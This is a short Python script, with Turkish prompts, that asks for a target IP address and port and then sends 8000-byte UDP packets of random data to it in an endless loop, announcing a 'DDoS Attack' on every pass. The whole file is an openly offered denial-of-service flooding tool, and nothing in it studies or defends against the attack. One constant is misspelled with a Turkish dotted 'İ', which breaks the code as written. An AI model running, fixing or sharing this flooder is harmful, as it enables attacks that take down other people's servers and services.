import socket
import random
import os
os.system("clear")
banner="""
  _      __    __   ___   ____              
 | | /| / /__ / /  / _ | / / /____ ___ __   
 | |/ |/ / -_) _ \/ __ |/ / __/ _ `/ // /   
 |__/|__/\__/_.__/_/ |_/_/\__/\_,_/\_, /    
                                  /___/
"""
print(banner)    

ip=raw_input("Hedef İp Adresini Giriniz: ") 
port=input("Portu Giriniz. Porta 80 Değerini Girmeniz Önerilir.")  

bytes=random._urandom(8000)
sock=socket.socket(socket.AF_İNET,socket.SOCK_DGRAM)

sayac=0
while True:
        sock.sendto(bytes,(ip,port))
        sayac=sayac+1
        print("DDoS Attack Başlatıldı!")
